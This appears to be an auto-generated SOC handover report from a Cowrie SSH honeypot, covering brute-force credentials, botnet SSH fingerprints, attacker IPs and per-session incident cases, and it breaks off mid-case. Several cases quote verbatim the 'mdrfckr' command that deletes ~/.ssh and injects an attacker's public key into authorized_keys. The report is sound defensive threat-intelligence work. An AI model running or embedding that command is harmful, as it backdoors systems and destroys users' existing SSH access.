# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-09 |
| **Generated At** | 2026-06-09T18:10:45Z |
| **Shift Time** | 18:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1022** |
| Confirmed Threats | **982** |
| False Positives Filtered | **40** (3.9%) |
| Unique Attacker IPs | **51** |
| Countries of Origin | **21** |
| High Severity Cases | **97** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **925** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **245** |
| Unique Credential Pairs | **120** |
| Unique Usernames | **83** |
| Unique Passwords | **92** |
| Successful Auth Pairs | **58** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 97 |
| `345gs5662d34` | 47 |
| `ubuntu` | 3 |
| `admin` | 3 |
| `test` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 47 |
| `3245gs5662d34` | 47 |
| `123456` | 26 |
| `1234` | 4 |
| `password` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 47 |
| `root` | `3245gs5662d34` | 47 |
| `root` | `admin` | 2 |
| `sysuser` | `sysuser` | 2 |
| `admin` | `Admin@2025` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `anubis` | `118.26.36.195` | 2026-06-09T14:59:44 |
| `root` | `3245gs5662d34` | `118.26.36.195` | 2026-06-09T14:59:47 |
| `root` | `2345` | `118.26.36.195` | 2026-06-09T15:07:14 |
| `root` | `asd123..` | `129.121.33.174` | 2026-06-09T15:07:55 |
| `root` | `3245gs5662d34` | `129.121.33.174` | 2026-06-09T15:08:03 |
| `root` | `pass@123` | `118.26.36.195` | 2026-06-09T15:12:40 |
| `root` | `123456as` | `118.26.36.195` | 2026-06-09T15:14:32 |
| `root` | `Aaa123456` | `118.26.36.195` | 2026-06-09T15:18:18 |
| `root` | `admin` | `71.229.1.186` | 2026-06-09T15:29:10 |
| `root` | `admin` | `111.39.167.59` | 2026-06-09T15:29:20 |
| `root` | `1234admin` | `154.70.102.114` | 2026-06-09T16:32:40 |
| `root` | `3245gs5662d34` | `154.70.102.114` | 2026-06-09T16:32:46 |
| `root` | `123456a.` | `154.70.102.114` | 2026-06-09T16:35:04 |
| `root` | `130590` | `154.70.102.114` | 2026-06-09T16:37:27 |
| `root` | `Abcd@123456` | `154.70.102.114` | 2026-06-09T16:39:49 |
| `root` | `12345Abc` | `154.70.102.114` | 2026-06-09T16:40:36 |
| `root` | `A100s200` | `154.70.102.114` | 2026-06-09T16:41:23 |
| `root` | `12345qwe` | `154.70.102.114` | 2026-06-09T16:42:13 |
| `root` | `123456zxc` | `103.166.182.155` | 2026-06-09T16:42:53 |
| `root` | `3245gs5662d34` | `103.166.182.155` | 2026-06-09T16:42:57 |
| `root` | `D13HH[` | `90.230.115.5` | 2026-06-09T16:43:33 |
| `root` | `Zxc!@#123` | `154.70.102.114` | 2026-06-09T16:44:42 |
| `root` | `qaz1wsx2` | `154.70.102.114` | 2026-06-09T16:45:31 |
| `root` | `Abcd@123456` | `172.172.196.177` | 2026-06-09T16:46:02 |
| `root` | `3245gs5662d34` | `172.172.196.177` | 2026-06-09T16:46:07 |
| `root` | `362514` | `154.70.102.114` | 2026-06-09T16:47:06 |
| `root` | `@qwer2025` | `103.67.78.49` | 2026-06-09T16:47:54 |
| `root` | `user1234` | `172.172.196.177` | 2026-06-09T16:47:56 |
| `root` | `Abc123456` | `154.70.102.114` | 2026-06-09T16:47:57 |
| `root` | `3245gs5662d34` | `103.67.78.49` | 2026-06-09T16:47:59 |
| `root` | `Qwer.123456` | `103.67.78.49` | 2026-06-09T16:48:17 |
| `root` | `qaz1wsx2` | `172.172.196.177` | 2026-06-09T16:49:54 |
| `root` | `Support@2024` | `154.70.102.114` | 2026-06-09T16:50:27 |
| `root` | `1qaz2wsx3EDC` | `103.67.78.49` | 2026-06-09T16:50:41 |
| `root` | `user1234` | `154.70.102.114` | 2026-06-09T16:51:17 |
| `root` | `Abc@2024` | `103.67.78.49` | 2026-06-09T16:51:54 |
| `root` | `!123` | `172.172.196.177` | 2026-06-09T16:51:55 |
| `root` | `!123` | `154.70.102.114` | 2026-06-09T16:52:13 |
| `root` | `abc@654321` | `103.67.78.49` | 2026-06-09T16:52:15 |
| `root` | `zhang123` | `154.70.102.114` | 2026-06-09T16:53:00 |
| `root` | `Support@2024` | `172.172.196.177` | 2026-06-09T16:53:50 |
| `root` | `12345Abc` | `172.172.196.177` | 2026-06-09T16:57:41 |
| `root` | `Zxc!@#123` | `172.172.196.177` | 2026-06-09T17:00:12 |
| `root` | `123456a.` | `172.172.196.177` | 2026-06-09T17:04:08 |
| `root` | `362514` | `172.172.196.177` | 2026-06-09T17:12:02 |
| `root` | `zhang123` | `172.172.196.177` | 2026-06-09T17:15:50 |
| `root` | `130590` | `172.172.196.177` | 2026-06-09T17:17:47 |
| `root` | `12345qwe` | `172.172.196.177` | 2026-06-09T17:19:38 |
| `root` | `1234admin` | `172.172.196.177` | 2026-06-09T17:25:27 |
| `root` | `Abc123456` | `172.172.196.177` | 2026-06-09T17:33:17 |
| `root` | `A100s200` | `172.172.196.177` | 2026-06-09T17:35:15 |
| `root` | `Ab123456!` | `209.99.189.174` | 2026-06-09T17:50:02 |
| `root` | `3245gs5662d34` | `209.99.189.174` | 2026-06-09T17:50:06 |
| `root` | `Ab123456!` | `148.66.132.204` | 2026-06-09T17:54:15 |
| `root` | `3245gs5662d34` | `148.66.132.204` | 2026-06-09T17:54:17 |
| `root` | `test1337` | `148.66.132.204` | 2026-06-09T17:58:35 |
| `root` | `asd1234!@#$` | `148.66.132.204` | 2026-06-09T18:00:42 |
| `root` | `123.com.CN` | `148.66.132.204` | 2026-06-09T18:05:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1022** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 242 |
| OpenSSH | 8 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 159 | 10 |
| `03a80b21afa8...` | Modern SSH client | 60 | 1 |
| `af8223ac9914...` | libssh-based | 20 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 6 | 6 |
| `bc9e7273cde2...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 159 | 10 | Mirai/variant |
| `03a80b21afa8...` | libssh | 60 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 20 | 1 | libssh-based |
| `acaa53e0a7d7...` | OpenSSH | 6 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `bc9e7273cde2...` | OpenSSH | 2 | 2 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 47 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `148.66.132.204`, `172.172.196.177`, `103.67.78.49`, `154.70.102.114`, `118.26.36.195`, `129.121.33.174`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **51** |
| Unique ASNs | **35** |
| High-Risk ASNs | **28** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS46562` | Performive LLC | 4 | LOW |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (97)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-987926ddfd62

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:59 |
| **Last Seen** | 2026-06-09 14:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:59:43` | `cowrie.session.connect` |
| `2026-06-09 14:59:43` | `cowrie.client.version` |
| `2026-06-09 14:59:43` | `cowrie.client.kex` |
| `2026-06-09 14:59:44` | `cowrie.login.success` |
| `2026-06-09 14:59:44` | `cowrie.session.params` |
| `2026-06-09 14:59:44` | `cowrie.command.input` |
| `2026-06-09 14:59:44` | `cowrie.command.failed` |
| `2026-06-09 14:59:44` | `cowrie.log.closed` |
| `2026-06-09 14:59:44` | `cowrie.session.params` |
| `2026-06-09 14:59:44` | `cowrie.command.input` |
| `2026-06-09 14:59:44` | `cowrie.session.file_download` |
| `2026-06-09 14:59:44` | `cowrie.log.closed` |
| `2026-06-09 14:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07bfc594f810

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:59 |
| **Last Seen** | 2026-06-09 14:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:59:46` | `cowrie.session.connect` |
| `2026-06-09 14:59:46` | `cowrie.client.version` |
| `2026-06-09 14:59:46` | `cowrie.client.kex` |
| `2026-06-09 14:59:47` | `cowrie.login.success` |
| `2026-06-09 14:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b949f3b2dba5

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:07 |
| **Last Seen** | 2026-06-09 15:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:07:14` | `cowrie.session.connect` |
| `2026-06-09 15:07:14` | `cowrie.client.version` |
| `2026-06-09 15:07:14` | `cowrie.client.kex` |
| `2026-06-09 15:07:14` | `cowrie.login.success` |
| `2026-06-09 15:07:14` | `cowrie.session.params` |
| `2026-06-09 15:07:14` | `cowrie.command.input` |
| `2026-06-09 15:07:14` | `cowrie.command.failed` |
| `2026-06-09 15:07:14` | `cowrie.log.closed` |
| `2026-06-09 15:07:15` | `cowrie.session.params` |
| `2026-06-09 15:07:15` | `cowrie.command.input` |
| `2026-06-09 15:07:15` | `cowrie.session.file_download` |
| `2026-06-09 15:07:15` | `cowrie.log.closed` |
| `2026-06-09 15:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f9d31f9a7b

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:07 |
| **Last Seen** | 2026-06-09 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:07:16` | `cowrie.session.connect` |
| `2026-06-09 15:07:16` | `cowrie.client.version` |
| `2026-06-09 15:07:17` | `cowrie.client.kex` |
| `2026-06-09 15:07:17` | `cowrie.login.success` |
| `2026-06-09 15:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2967951ed3

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-06-09 15:07 |
| **Last Seen** | 2026-06-09 15:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:07:54` | `cowrie.session.connect` |
| `2026-06-09 15:07:54` | `cowrie.client.version` |
| `2026-06-09 15:07:54` | `cowrie.client.kex` |
| `2026-06-09 15:07:55` | `cowrie.login.success` |
| `2026-06-09 15:07:56` | `cowrie.session.params` |
| `2026-06-09 15:07:56` | `cowrie.command.input` |
| `2026-06-09 15:07:56` | `cowrie.command.failed` |
| `2026-06-09 15:07:57` | `cowrie.log.closed` |
| `2026-06-09 15:07:57` | `cowrie.session.params` |
| `2026-06-09 15:07:57` | `cowrie.command.input` |
| `2026-06-09 15:07:57` | `cowrie.session.file_download` |
| `2026-06-09 15:07:57` | `cowrie.log.closed` |
| `2026-06-09 15:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be28ec726a49

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-06-09 15:08 |
| **Last Seen** | 2026-06-09 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:08:01` | `cowrie.session.connect` |
| `2026-06-09 15:08:01` | `cowrie.client.version` |
| `2026-06-09 15:08:01` | `cowrie.client.kex` |
| `2026-06-09 15:08:03` | `cowrie.login.success` |
| `2026-06-09 15:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05e16ad52fca

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:12 |
| **Last Seen** | 2026-06-09 15:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:12:40` | `cowrie.session.connect` |
| `2026-06-09 15:12:40` | `cowrie.client.version` |
| `2026-06-09 15:12:40` | `cowrie.client.kex` |
| `2026-06-09 15:12:40` | `cowrie.login.success` |
| `2026-06-09 15:12:40` | `cowrie.session.params` |
| `2026-06-09 15:12:40` | `cowrie.command.input` |
| `2026-06-09 15:12:40` | `cowrie.command.failed` |
| `2026-06-09 15:12:40` | `cowrie.log.closed` |
| `2026-06-09 15:12:41` | `cowrie.session.params` |
| `2026-06-09 15:12:41` | `cowrie.command.input` |
| `2026-06-09 15:12:41` | `cowrie.session.file_download` |
| `2026-06-09 15:12:41` | `cowrie.log.closed` |
| `2026-06-09 15:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7554369cf6

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:12 |
| **Last Seen** | 2026-06-09 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:12:42` | `cowrie.session.connect` |
| `2026-06-09 15:12:42` | `cowrie.client.version` |
| `2026-06-09 15:12:43` | `cowrie.client.kex` |
| `2026-06-09 15:12:43` | `cowrie.login.success` |
| `2026-06-09 15:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5517862787a5

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:14 |
| **Last Seen** | 2026-06-09 15:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:14:32` | `cowrie.session.connect` |
| `2026-06-09 15:14:32` | `cowrie.client.version` |
| `2026-06-09 15:14:32` | `cowrie.client.kex` |
| `2026-06-09 15:14:32` | `cowrie.login.success` |
| `2026-06-09 15:14:33` | `cowrie.session.params` |
| `2026-06-09 15:14:33` | `cowrie.command.input` |
| `2026-06-09 15:14:33` | `cowrie.command.failed` |
| `2026-06-09 15:14:33` | `cowrie.log.closed` |
| `2026-06-09 15:14:33` | `cowrie.session.params` |
| `2026-06-09 15:14:33` | `cowrie.command.input` |
| `2026-06-09 15:14:33` | `cowrie.session.file_download` |
| `2026-06-09 15:14:33` | `cowrie.log.closed` |
| `2026-06-09 15:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e8db575ea7

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:14 |
| **Last Seen** | 2026-06-09 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:14:35` | `cowrie.session.connect` |
| `2026-06-09 15:14:35` | `cowrie.client.version` |
| `2026-06-09 15:14:35` | `cowrie.client.kex` |
| `2026-06-09 15:14:35` | `cowrie.login.success` |
| `2026-06-09 15:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef690e9224a9

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:18 |
| **Last Seen** | 2026-06-09 15:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:18:18` | `cowrie.session.connect` |
| `2026-06-09 15:18:18` | `cowrie.client.version` |
| `2026-06-09 15:18:18` | `cowrie.client.kex` |
| `2026-06-09 15:18:18` | `cowrie.login.success` |
| `2026-06-09 15:18:18` | `cowrie.session.params` |
| `2026-06-09 15:18:18` | `cowrie.command.input` |
| `2026-06-09 15:18:18` | `cowrie.command.failed` |
| `2026-06-09 15:18:19` | `cowrie.log.closed` |
| `2026-06-09 15:18:19` | `cowrie.session.params` |
| `2026-06-09 15:18:19` | `cowrie.command.input` |
